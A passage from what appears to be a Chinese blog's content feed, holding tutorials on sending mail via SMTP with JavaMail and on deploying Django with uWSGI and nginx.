        <content type="html"><![CDATA[<p>1.SMTP协议简介</p><p>SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议，目标是向用户提供高效、可靠的邮件传输。它的一个重要特点是它能够在传送中接力传送邮件，即邮件可以通过不同网络上的主机接力式传送。通常它工作在两种情况下：一是邮件从客户机传输到服务器；二是从某一个服务器传输到另一个服务器。SMTP 是一个请求&#x2F;响应协议，它监听 25 号端口，用于接收用户的 Mail 请求，并与远端 Mail 服务器建立 SMTP 连接。</p><span id="more"></span><p>2.SMTP协议工作机制</p><p>SMTP通常有两种工作模式。发送SMTP和接收SMTP。具体工作方式为：发送SMTP在接收到用户的邮件请求后，判断此邮件是否为本地邮件，若是直接投送到用户的邮箱，否则向DNS查询远端邮件服务器的MX记录，并建立与远端接收SMTP之间的一个双向传送通道，此后SMTP命令由发送SMTP发出，由接收SMTP接收，而应答则反方向传送。一旦传送通道建立，SMTP发送者发送MAIL命令指明邮件发送者。如果SMTP接收者可以接收邮件则返回OK应答。SMTP发送者再发出RCPT命令确认邮件是否接收到。如果SMTP接收者接收，则返回OK应答；如果不能接收到，则发出拒绝接收应答（但不中止整个邮件操作），双方将如此反复多次。当接收者收到全部邮件后会接收到特别的序列，入伏哦接收者成功处理了邮件，则返回OK应答。</p><p>3.SMTP的连接和发送过程<br>（a）建立TCP连接<br>（b）客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；服务器端正希望以OK作为响应，表明准备接收。<br>（c）客户端发送RCPT命令，以标识该电子邮件的计划接收人，可以有多个RCPT行；服务器端则表示是否愿意为收件人接收邮件<br>（d）协商结束，发送邮件，用命令DATA发送<br>（e）以.表示结束输入内容一起发送出去<br>（f）结束此次发送，用QUIT命令退出。</p><p>4.准备工作<br>1）注册新浪邮箱<br>2）准备包文件 <br>activation-1.1.jar 以及 javax.mail-1.4.4.jar<br>下载链接<br><a href="https://cdn.zhengxiangling.com/activation-1.1.jar">activation-1.1.jar</a><br><a href="https://cdn.zhengxiangling.com/activation-1.1.jar">javax.mail-1.4.4.jar</a><br>3)导入包文件</p><p>在项目中新建<code>lib</code>文件夹，将两个包文件放入文件夹中<br><img src="https://cdn.zhengxiangling.com/17-11-23/10495710.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-11-23/10495710.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>右击包文件，选择 Build Path -&gt; Configure Build Path，然后出现下图<br><img src="https://cdn.zhengxiangling.com/17-11-23/6832403.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-11-23/6832403.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>点击 Libralies -&gt; Add JARS -&gt; 选中<code>lib</code>文件夹中的 <code>.jar</code>文件，重复步骤导入两个包文件</p><p>5.代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package <span class="variable constant_">SMTP</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Address</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Message</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">MessagingException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Session</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Transport</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">internet</span>.<span class="property">InternetAddress</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">internet</span>.<span class="property">MimeMessage</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">mail</span>.<span class="property">util</span>.<span class="property">MailSSLSocketFactory</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">security</span>.<span class="property">GeneralSecurityException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Date</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Properties</span>;</span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">SMTP</span> &#123;  </span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">MessagingException</span>,</span><br><span class="line"><span class="title class_">GeneralSecurityException</span> &#123;</span><br><span class="line"><span class="title class_">Properties</span> props = <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"><span class="comment">// 开启debug调试</span></span><br><span class="line">props.<span class="title function_">setProperty</span>(<span class="string">&quot;mail.debug&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="comment">// 发送服务器需要身份验证</span></span><br><span class="line">props.<span class="title function_">setProperty</span>(<span class="string">&quot;mail.smtp.auth&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="comment">// 设置邮件服务器主机名</span></span><br><span class="line">props.<span class="title function_">setProperty</span>(<span class="string">&quot;mail.host&quot;</span>, <span class="string">&quot;smtp.sina.cn&quot;</span>);</span><br><span class="line"><span class="comment">// 发送邮件协议名称</span></span><br><span class="line">props.<span class="title function_">setProperty</span>(<span class="string">&quot;mail.transport.protocol&quot;</span>, <span class="string">&quot;smtp&quot;</span>);</span><br><span class="line"><span class="title class_">Session</span> session = <span class="title class_">Session</span>.<span class="title function_">getInstance</span>(props);</span><br><span class="line"><span class="title class_">Message</span> msg = <span class="keyword">new</span> <span class="title class_">MimeMessage</span>(session);</span><br><span class="line">msg.<span class="title function_">setSubject</span>(<span class="string">&quot;STMP 测试&quot;</span>);</span><br><span class="line"><span class="title class_">StringBuilder</span> builder = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">builder.<span class="title function_">append</span>(<span class="string">&quot;My name is Elijah&quot;</span>);</span><br><span class="line">msg.<span class="title function_">setText</span>(builder.<span class="title function_">toString</span>());</span><br><span class="line">msg.<span class="title function_">setFrom</span>(<span class="keyword">new</span> <span class="title class_">InternetAddress</span>(<span class="string">&quot;your_number@sina.cn&quot;</span>));</span><br><span class="line"><span class="title class_">Transport</span> transport = session.<span class="title function_">getTransport</span>();</span><br><span class="line">transport.<span class="title function_">connect</span>(<span class="string">&quot;smtp.sina.cn&quot;</span>, <span class="string">&quot;xxx@sina.cn&quot;</span>, <span class="string">&quot;your_password&quot;</span>);</span><br><span class="line">transport.<span class="title function_">sendMessage</span>(msg, <span class="keyword">new</span> <span class="title class_">Address</span>[] &#123; <span class="keyword">new</span> <span class="title class_">InternetAddress</span>(<span class="string">&quot;xxx@sina.cn&quot;</span>) &#125;);</span><br><span class="line">transport.<span class="title function_">close</span>();</span><br><span class="line">&#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>参数分析</p><p> SMTP的响应，它的一般形式是：XXX  Readable Illustration。XXX是三位十进制数；Readable Illustration是可读的解释说明，用来表明命令是否成功等。XXX具有如下的规律：以2开头的表示成功，以4和5开头的表示失败，以3开头的表示未完成（进行中）</p><p> C: client S: server</p><p>域服务器准备好了，之后的为域服务器自动返回的信息</p><p>HELO 客户端为标识自己的身份而发送的命令（通常带域名）</p><p>250 请求动作完成</p><p>AUTH LOGIN 请求认证</p><p>等待用户输入验证信息</p><p>dxNlcm5hbWU6  服务器的响应——经过base64编码了的“Username”&#x3D; </p><p>334 UGFzc3dvcmQ6  经过BASE64编码了的”Password:”&#x3D; </p><p>235 auth successfully 认证成功   </p><p>MAIL FROM: 发送者邮箱</p><p>RCPT TO:  接收者邮箱 </p><p>DATA  请求发送数据  </p><p>开始邮件输入，以.结束</p><p><CR><LF> 回车 + 换行</p><p>QUIT 终止会话</p><p>服务器关闭</p>]]></content>
      
      
      
        <tags>
            
            <tag> 电子邮件 </tag>
            
            <tag> SMTP </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用uWSGI + nginx 提高性能，配置 uWSGI 使用 .ini 文件去运行项目（基本配置）</title>
      <link href="/2017/10/27/%E4%BD%BF%E7%94%A8uWSGI-nginx-%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%8C%E9%85%8D%E7%BD%AE-uWSGI-%E4%BD%BF%E7%94%A8-ini-%E6%96%87%E4%BB%B6%E5%8E%BB%E8%BF%90%E8%A1%8C%E9%A1%B9%E7%9B%AE%EF%BC%88%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%EF%BC%89/"/>
      <url>/2017/10/27/%E4%BD%BF%E7%94%A8uWSGI-nginx-%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%8C%E9%85%8D%E7%BD%AE-uWSGI-%E4%BD%BF%E7%94%A8-ini-%E6%96%87%E4%BB%B6%E5%8E%BB%E8%BF%90%E8%A1%8C%E9%A1%B9%E7%9B%AE%EF%BC%88%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>快速配置 uWSGI + nginx 运行Django 项目</p><span id="more"></span><p>1.新建 Django 项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject site_uwsgi</span><br><span class="line"><span class="built_in">cd</span> site_uwsgi</span><br></pre></td></tr></table></figure><p>2.对网站进行 nginx 配置</p><p>目录中新建 <code>site_uwsgi.conf</code> 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen  <span class="number">8001</span>;</span><br><span class="line">    server_name your_server_name.<span class="property">com</span>;</span><br><span class="line">    client_max_body_size 50m;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    location /<span class="keyword">static</span>/ &#123;</span><br><span class="line">        alias /data/www/vhosts/site_uwsgi/<span class="keyword">static</span>/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-<span class="title class_">Forwarded</span>-<span class="title class_">For</span> $proxy_add_x_forwarded_for;</span><br><span class="line">        uwsgi_pass  web;</span><br><span class="line">        include /data/www/vhosts/site_uwsgi/uwsgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">    access_log /<span class="keyword">var</span>/log/nginx/site_uwsgi.<span class="property">access_log</span>;</span><br><span class="line">    error_log /<span class="keyword">var</span>/log/nginx/site_uwsgi.<span class="property">error_log</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upstream web &#123;</span><br><span class="line">    server <span class="attr">unix</span>:<span class="comment">///data/www/vhosts/site_uwsgi/socket.sock;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接进 <code>/etc/nginx/sites-enabled/</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /data/www/vhosts/site_uwsgi/site_uwsgi.conf /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure><p>3.编辑 <code>site_uwsgi/settings.py</code> 文件及收集静态资源</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">ALLOWED_HOSTS</span> = [<span class="string">&#x27;...&#x27;</span>] # 有服务器的话需增加服务器ip</span><br><span class="line"><span class="variable constant_">STATIC_ROOT</span> = os.<span class="property">path</span>.<span class="title function_">join</span>(<span class="variable constant_">BASE_DIR</span>, <span class="string">&#x27;static/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>收集静态资源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py collectstatic</span><br></pre></td></tr></table></figure><p>4.目录中新建 <code>uwsgi_params</code> 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">uwsgi_param  <span class="variable constant_">QUERY_STRING</span>       $query_string;</span><br><span class="line">uwsgi_param  <span class="variable constant_">REQUEST_METHOD</span>     $request_method;</span><br><span class="line">uwsgi_param  <span class="variable constant_">CONTENT_TYPE</span>       $content_type;</span><br><span class="line">uwsgi_param  <span class="variable constant_">CONTENT_LENGTH</span>     $content_length;</span><br><span class="line"></span><br><span class="line">uwsgi_param  <span class="variable constant_">REQUEST_URI</span>        $request_uri;</span><br><span class="line">uwsgi_param  <span class="variable constant_">PATH_INFO</span>          $document_uri;</span><br><span class="line">uwsgi_param  <span class="variable constant_">DOCUMENT_ROOT</span>      $document_root;</span><br><span class="line">uwsgi_param  <span class="variable constant_">SERVER_PROTOCOL</span>    $server_protocol;</span><br><span class="line">uwsgi_param  <span class="variable constant_">REQUEST_SCHEME</span>     $scheme;</span><br><span class="line">uwsgi_param  <span class="variable constant_">HTTPS</span>              $https if_not_empty;</span><br><span class="line"></span><br><span class="line">uwsgi_param  <span class="variable constant_">REMOTE_ADDR</span>        $remote_addr;</span><br><span class="line">uwsgi_param  <span class="variable constant_">REMOTE_PORT</span>        $remote_port;</span><br><span class="line">uwsgi_param  <span class="variable constant_">SERVER_PORT</span>        $server_port;</span><br><span class="line">uwsgi_param  <span class="variable constant_">SERVER_NAME</span>        $server_name;</span><br></pre></td></tr></table></figure><p>5.修改 <code>/etc/nginx/nginx.conf</code> 的 <code>user</code> 为 <code>root</code> 用户</p><p>重启 nginx </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><p>6.配置 uWSGI 使用 .ini 文件去运行项目<br><code>site_uwsgi.ini</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># site_uwsgi.<span class="property">ini</span> file</span><br><span class="line">[uwsgi]</span><br><span class="line"># <span class="title class_">Django</span>-related settings</span><br><span class="line"># the base directory (full path)</span><br><span class="line">chdir           = <span class="regexp">/data/</span>www/vhosts/site_uwsgi/</span><br><span class="line"># <span class="title class_">Django</span><span class="string">&#x27;s wsgi file</span></span><br><span class="line"><span class="string">module          = site_uwsgi.wsgi</span></span><br><span class="line"><span class="string"># the virtualenv (full path)</span></span><br><span class="line"><span class="string"># process-related settings</span></span><br><span class="line"><span class="string"># master</span></span><br><span class="line"><span class="string">master          = true</span></span><br><span class="line"><span class="string"># maximum number of worker processes</span></span><br><span class="line"><span class="string">processes       = 30</span></span><br><span class="line"><span class="string"># the socket (use the full path to be safe</span></span><br><span class="line"><span class="string">socket          = /data/www/vhosts/site_uwsgi/socket.sock</span></span><br><span class="line"><span class="string"># ... with appropriate permissions - may be needed</span></span><br><span class="line"><span class="string">chmod-socket    = 664</span></span><br><span class="line"><span class="string"># clear environment on exit</span></span><br><span class="line"><span class="string">vacuum          = true</span></span><br><span class="line"><span class="string"># pidfile</span></span><br><span class="line"><span class="string">pidfile         = /data/www/vhosts/site_uwsgi/site_uwsgi.pid</span></span><br><span class="line"><span class="string"># logger</span></span><br><span class="line"><span class="string"># daemonize       = /data/www/vhosts/site_uwsgi/access.log</span></span><br></pre></td></tr></table></figure><p>7.后台挂载 uwsgi:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup uwsgi --ini mysite_uwsgi.ini &amp;</span><br></pre></td></tr></table></figure><p>输入 <code>ip:8001</code>, <code>done</code></p><p><img src="https://cdn.zhengxiangling.com/17-10-27/97231926.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-10-27/97231926.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>8.挂载之后，每次修改models.py，需要 reload uwsgi，和重启数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --reload yxpp.pid</span><br><span class="line">service mysql restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> uWSGI </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用uWSGI + nginx 提高性能，部署Django项目（入门）</title>
      <link href="/2017/10/26/%E4%BD%BF%E7%94%A8uWSGI-nginx%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%8C%E9%83%A8%E7%BD%B2Django%E9%A1%B9%E7%9B%AE%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
      <url>/2017/10/26/%E4%BD%BF%E7%94%A8uWSGI-nginx%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%8C%E9%83%A8%E7%BD%B2Django%E9%A1%B9%E7%9B%AE%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>Web服务器是面向外部世界的。它可以直接从文件系统中提供（HTML, images, CSS 等）服务文件。然而，它不能直接和Django应用进行通信；它需要可以运行应用程序的东西，从web客户端（如浏览器）中请求它和返回响应。</p><p>Web服务网关接口（Web Server Gateway Interface） - WSGI - 扮演着这个角色。WSGI 是基于Python的一个标准。</p><p>uWSGI 是一个Web服务器，实现了 WSGI、uwsgi、http等协议。</p><span id="more"></span><h5 id="使用-uWSGI-前的准备工作"><a href="#使用-uWSGI-前的准备工作" class="headerlink" title="使用 uWSGI 前的准备工作"></a>使用 uWSGI 前的准备工作</h5><p>具体代码基于 Linux(Ubuntu)，window 和 mac 的环境安装方法和引用的文件路径可能会存在偏差。</p><h6 id="virtualenv（自选）"><a href="#virtualenv（自选）" class="headerlink" title="virtualenv（自选）"></a>virtualenv（自选）</h6><p>Python的虚拟环境，可以切换不同python的版本。这里不介绍virtualenv的安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">virtualenv uwsgi-tutorial</span><br><span class="line"><span class="built_in">cd</span> uwsgi-tutorial</span><br><span class="line"><span class="built_in">source</span> bin/activate</span><br></pre></td></tr></table></figure><h6 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h6><p>安装 Django</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install Django</span><br><span class="line">django-admin.py startproject mysite</span><br><span class="line"><span class="built_in">cd</span> mysite</span><br></pre></td></tr></table></figure><h5 id="uWSGI-基本安装和配置"><a href="#uWSGI-基本安装和配置" class="headerlink" title="uWSGI 基本安装和配置"></a>uWSGI 基本安装和配置</h5><h6 id="安装-uWSGI"><a href="#安装-uWSGI" class="headerlink" title="安装 uWSGI"></a>安装 uWSGI</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><p>当然还有其他的方法来安装uWSGI，不过<code>pip</code>来安装是最好的安装方法之一。</p><h6 id="基本测试"><a href="#基本测试" class="headerlink" title="基本测试"></a>基本测试</h6><p>创建 <code>test.py</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># test.py</span><br><span class="line">def application(env, start_response):</span><br><span class="line">    start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;,&#x27;text/html&#x27;)])</span><br><span class="line">    return [b&quot;Hello World&quot;] # python3</span><br><span class="line">    #return [&quot;Hello World&quot;] # python2</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>Python3 返回字符串时要求用bytes()</p></blockquote></blockquote><p>运行 uWSGI:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --http :8000 --wsgi-file test.py</span><br></pre></td></tr></table></figure><p>选项参数说明：</p><table><thead><tr><th>参数</th><th align="center">解释</th></tr></thead><tbody><tr><td>http:8000</td><td align="center">使用http协议，端口8000</td></tr><tr><td>wsgi-file test.py</td><td align="center">加载指定的文件，test.py</td></tr></tbody></table><h6 id="测试你的Django项目"><a href="#测试你的Django项目" class="headerlink" title="测试你的Django项目"></a>测试你的Django项目</h6><p>现在我们用 uWSGI 去运行Django网站。</p><p>先测试你的<code>mysite</code>项目已经可以运行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver 0.0.0.0:8000</span><br></pre></td></tr></table></figure><p>如果已经可以运行，换用uWSGI来运行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --http :8000 --module mysite.wsgi</span><br></pre></td></tr></table></figure><p><code>module mysite.wsgi</code>： 加载指定的wsgi模块</p><p>如果能够成功进行访问，说明uWSGI已经能够对Django应用服务。</p><h5 id="nginx-基本配置"><a href="#nginx-基本配置" class="headerlink" title="nginx 基本配置"></a>nginx 基本配置</h5><h6 id="安装-nginx"><a href="#安装-nginx" class="headerlink" title="安装 nginx"></a>安装 nginx</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br><span class="line">sudo /etc/init.d/nginx start    <span class="comment"># start nginx</span></span><br></pre></td></tr></table></figure><h6 id="对网站进行-nginx-配置"><a href="#对网站进行-nginx-配置" class="headerlink" title="对网站进行 nginx 配置"></a>对网站进行 nginx 配置</h6><p>现在需要 <code>uwsgi_params</code>文件，在 nginx 目录中 uWSGI分配时会用来。可以从 <a href="https://github.com/nginx/nginx/blob/master/conf/uwsgi_params">https://github.com/nginx/nginx/blob/master/conf/uwsgi_params</a> 中复制此文件放在项目的目录中。然后在 nginx 中将会使用到它。</p><p>现在创建一个 <code>mysite_nginx.conf</code> 文件，将下列信息填入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># mysite_nginx.<span class="property">conf</span></span><br><span class="line"></span><br><span class="line"># the upstream component nginx needs to connect to</span><br><span class="line">upstream django &#123;</span><br><span class="line">    #server <span class="attr">unix</span>:<span class="comment">///data/www/vhosts/mysite/socket.sock; #for a file socket</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># configuration <span class="keyword">of</span> the server</span><br><span class="line">server &#123;</span><br><span class="line">    # the port your site will be served on</span><br><span class="line">    listen      <span class="number">8000</span>;</span><br><span class="line">    # the domain name it will serve <span class="keyword">for</span></span><br><span class="line">    server_name your_server_name.<span class="property">com</span>; # substitute your machine<span class="string">&#x27;s IP address or FQDN</span></span><br><span class="line"><span class="string">    charset     utf-8;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # max upload size</span></span><br><span class="line"><span class="string">    client_max_body_size 75M;   # adjust to taste</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # Django media</span></span><br><span class="line"><span class="string">    location /media  &#123;</span></span><br><span class="line"><span class="string">        alias /data/www/vhosts/mysite/media;  # your Django project&#x27;</span>s media files - amend <span class="keyword">as</span> required</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /<span class="keyword">static</span> &#123;</span><br><span class="line">        alias /data/www/vhosts/mysite/<span class="keyword">static</span>; # your <span class="title class_">Django</span> project<span class="string">&#x27;s static files - amend as required</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # Finally, send all non-media requests to the Django server.</span></span><br><span class="line"><span class="string">    location / &#123;</span></span><br><span class="line"><span class="string">        uwsgi_pass  django;</span></span><br><span class="line"><span class="string">        include     /data/www/vhosts/mysite/uwsgi_params; # the uwsgi_params file you installed</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>这个配置文件告诉nginx去服务从系统文件来的媒体和静态文件，和处理来自Django干预的请求。对于大规模部署的项目，需要很好的考虑让一个服务去处理静态&#x2F;媒体资源，另一个去处理Django的应用，但是现在这个配置已经够用了。</p><p>然后用链接符号<code>ln</code>将该文件放到<code>/etc/nginx/sites-enabled</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /data/www/vhosts/mysite/mysite_nginx.conf /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure><h6 id="部署静态文件"><a href="#部署静态文件" class="headerlink" title="部署静态文件"></a>部署静态文件</h6><p>在运行 nginx 之前，你需要手机 Django 的静态文件放到静态文件夹中。<br>编辑 <code>mysite/settings.py</code> 增加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STATIC_ROOT = os.path.join(BASE_DIR, <span class="string">&quot;static/&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py collectstatic</span><br></pre></td></tr></table></figure><h6 id="nginx-基本测试"><a href="#nginx-基本测试" class="headerlink" title="nginx 基本测试"></a>nginx 基本测试</h6><p>重启 nginx：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><p>在<code>mysite</code>项目新建<code>media</code>文件夹，在其中放入一张<code>media.png</code>图片，访问 <a href="http://0.0.0.0:8000/media/media.png">http://0.0.0.0:8000/media/media.png</a> ，如果成功访问，说明 nginx 已成功对文件进行服务。</p><p>如果访问失败，看错误日志然后做相应的修改，然后重启 nginx。</p><h5 id="使用-Unix-sockets-来代替端口"><a href="#使用-Unix-sockets-来代替端口" class="headerlink" title="使用 Unix sockets 来代替端口"></a>使用 Unix sockets 来代替端口</h5><p>到目前为止，我们已经使用了TCP端口的套接字（socket），因为它比较的简单，但实际上使用 Unix socket 会更好 - 开销较少。</p><p>编辑 <code>mysite_nginx.conf</code><br>取消下列注释</p><figure class="highlight plaintext"><table><tr><td 